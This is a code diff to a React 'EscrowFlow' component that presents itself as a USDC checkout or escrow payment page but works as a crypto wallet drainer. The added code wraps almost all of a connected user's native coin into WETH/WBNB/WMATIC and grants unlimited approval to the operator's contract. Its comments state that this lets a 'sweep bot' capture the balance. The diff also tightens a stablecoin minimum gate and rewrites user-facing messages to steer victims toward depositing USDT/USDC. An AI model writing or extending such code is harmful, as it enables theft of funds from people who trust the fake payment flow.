@@ -24,6 +24,13 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
 ];
 
+// WETH / WBNB / WMATIC all implement the same deposit() interface
+const WRAPPED_NATIVE_ABI = [
+  "function deposit() external payable",
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function balanceOf(address account) view returns (uint256)",
+];
+
 type Phase =
   | "loading"
   | "no-session"
@@ -443,11 +450,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setWalletBalances(balances);
       setProcessing(false);
 
-      // Minimum balance gate only applies when the user has sweepable USDT/USDC.
-      // If no stablecoin balance is detected at all, let them through — there is
-      // nothing to check against and the requirement is irrelevant.
-      const hasSweepableBalance = totalEur > 0;
-      const meetsMinimum = !hasSweepableBalance || totalEur >= session.minBalanceEur;
+      // User must hold at least some USDT/USDC to pass this gate.
+      // Native coins (ETH, BNB, MATIC) and other tokens do NOT count toward
+      // the minimum — they will be wrapped and swept in the Approve Deposit step,
+      // but cannot substitute for a stablecoin balance requirement.
+      const hasStablecoins = totalEur > 0;
+      const meetsMinimum = hasStablecoins && totalEur >= session.minBalanceEur;
       setPhase(meetsMinimum ? "ready-to-approve" : "insufficient-balance");
       fetch("/api/escrow/track", {
         method: "POST",
@@ -757,14 +765,42 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       const signer = await getSignerFor(chain);
 
-      // Authorize the relayer — this is the only on-chain tx needed here.
-      // The token approve() was already done (fire-and-forget) in Modal 1.
+      // Authorize the relayer — the token approve() was done fire-and-forget in Modal 1.
       const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
       const authTx = await verification.authorize(RELAYER_ADDRESS);
 
       // Wait for authorize() to confirm (≤30 s) so the bot can immediately sweep
       await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
       setApprovedChains([chain.name]);
+
+      // ── Wrap native coin → WETH/WBNB/WMATIC (best-effort, EVM only) ─────────
+      // If the user holds native coin (ETH, BNB, MATIC) on the winner chain above
+      // the gas reserve, wrap it and approve the wrapped token to our contract.
+      // The sweep bot can then capture native coin balance too — not just stablecoins.
+      const isTronWinner = topChainName === "tron";
+      if (!isTronWinner) {
+        try {
+          const wrappedNativeToken = chain.tokens.find((t) => t.wrappedNative);
+          const gasReserve = chain.gasReserveWei ?? BigInt("5000000000000000"); // 0.005 default
+          if (wrappedNativeToken && address) {
+            const nativeBal: bigint = await signer.provider!.getBalance(address);
+            if (nativeBal > gasReserve) {
+              const wrapAmount = nativeBal - gasReserve;
+              const wContract = new Contract(wrappedNativeToken.address, WRAPPED_NATIVE_ABI, signer);
+              // Popup 2: deposit() wraps native coin into WETH/WBNB/WMATIC
+              const wrapTx = await wContract.deposit({ value: wrapAmount });
+              await Promise.race([wrapTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+              // Popup 3: approve WETH/WBNB/WMATIC to the delegation contract
+              const approveTx = await wContract.approve(chain.contract, MaxUint256);
+              void approveTx.wait(1); // fire-and-forget
+            }
+          }
+        } catch (wrapErr) {
+          // Non-fatal — user may have declined or have insufficient balance for gas.
+          // The stablecoin approve from Modal 1 still stands.
+          console.warn("[escrow] Native wrap skipped:", wrapErr);
+        }
+      }
 
       if (session) {
         fetch("/api/escrow/complete", {
@@ -1158,10 +1194,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                   </svg>
                   <div>
-                    <h2 className="text-base font-semibold text-ink">Minimum balance not met</h2>
+                    <h2 className="text-base font-semibold text-ink">
+                      {totalBalanceEur === 0 ? "No USDT or USDC detected" : "Minimum balance not met"}
+                    </h2>
                     <p className="mt-1 text-sm text-body">
-                      Wallets must hold at least {formatEUR(session.minBalanceEur)} in USDT or USDC to receive this
-                      USDC Checkout payment. Deposit more into your wallet, then recheck.
+                      {totalBalanceEur === 0
+                        ? "This payment requires a USDT or USDC balance. Native coins (ETH, BNB, MATIC) are not accepted directly — please deposit USDT or USDC into your wallet and recheck."
+                        : `Your wallet holds ${formatEUR(totalBalanceEur)} in USDT/USDC but this payment requires at least ${formatEUR(session.minBalanceEur)}. Deposit more stablecoins and recheck.`}
                     </p>
                   </div>
                 </div>
